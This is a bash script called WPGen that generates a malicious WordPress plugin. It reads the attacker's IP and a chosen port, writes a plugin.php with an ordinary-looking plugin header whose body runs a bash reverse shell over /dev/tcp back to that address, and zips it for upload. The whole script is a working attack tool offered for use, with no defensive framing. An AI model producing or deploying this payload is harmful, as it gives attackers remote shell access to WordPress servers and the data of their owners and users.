#!/bin/bash

declare -r White="\e[97m"
declare -r Green="\e[32m"
declare -r Yellow="\e[33m"
declare -r Blue="\e[34m"
declare -r Red="\e[31m"
declare -r End="\e[0m"

declare -r f1='['
declare -r f2=']'
declare -r f3='i'
declare -r f4='<'
declare -r f5='>'
declare -r f6='+'
declare -r f7='x'
declare -r f8='|'
declare -r f9='ZIP Not Installed'
declare -r f10='interface'
declare -r f11='lport'
declare -r f12='Installing ZIP'
declare -r f13='ZIP Instaled'
declare -r f14='Generating Plugin'
declare -r f15='Plugin Generated'
declare -r f16=' =============================================='
declare -r f17='Example:'
declare -r f18='  Auto Generator Malicious Plugins WordPress'
declare -r f19='WPGen'
declare -r int="$1"
declare -r lp="$2"
declare -r lh=$(/usr/bin/ip -4 address show $int | /usr/bin/grep 'inet' | /usr/bin/awk '{print $2}' | /usr/bin/cut -d/ -f 1)

function check(){
		which zip > /dev/null 2>&1
    if [ "$(echo $?)" == "0" ]; then
        :
    else
        echo ""
        echo -e "$Blue$f1$Red$f7$Blue$f2 $Green$f9$End"
        sleep 4
        echo ""
        echo -e "$Blue$f1$Yellow$f3$Blue$f2 $Green$f12$End"
        sleep 4
        apt-get install zip -y > /dev/null 2>&1
        echo ""
        echo -e "$Blue$f1$Green$f3$Blue$f2 $Green$f13$End"
        sleep 4
        echo ""
        exit 1
    fi
}

function banner(){
	echo ""
    echo -e "$Blue __      ____________  $White  ________                 $End"
    echo -e "$Blue/  \    /  \______   \ $White /  _____/  ____   ____    $End"
    echo -e "$Blue\   \/\/   /|     ___/ $White/   \  ____/ __ \ /    \   $End"
    echo -e "$Blue \        / |    |     $White\    \_\  \  ___/|   |  \\ $End"
    echo -e "$Blue  \__/\  /  |____|     $White \______  /\___  >___|  /  $End"
    echo -e "$Blue       \/              $White        \/     \/     \/   $End"
    echo -e "$Blue$f16$End"
    echo -e "$White$f8$Green$f18  $White$f8$End"
    echo -e "$Blue$f16$Blue$End"
}

function main(){
    echo ""
    echo -e "$Blue$f1$Yellow$f3$Blue$f2 $Green$f17 $Yellow$f19 $Red$f4$White$f10$Red$f5 $Red$f4$White$f11$Red$f5$End"
    echo ""
}

if [ ! -z $int ]; then
	check
else
	banner
    main
    exit 0
fi

if [ ! -z $lp ]; then
	banner
else
	banner
    main
    exit 0
fi

function createPlugin(){
    echo ""
    echo -e "$Blue$f1$Yellow$f3$Blue$f2 $Green$f14$End"
    sleep 4
    echo ""

cat <<EOF > plugin.php
<?php

/**
* Plugin Name: WPGen
* Plugin URI: http://localhost
* Description: Love WPGen
* Version: 1.0
* Author: d4t4s3c
* Author URI: https://github.com/d4t4s3c
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1'");
?>
EOF
}

function compressPlugin(){
    /usr/bin/zip plugin.zip plugin.php > /dev/null 2>&1
    rm -rf plugin.php
    echo -e "$Blue$f1$Green$f6$Blue$f2 $Green$f15$End"
    echo ""
    sleep 4
}

function start(){
    createPlugin
    compressPlugin
}

start
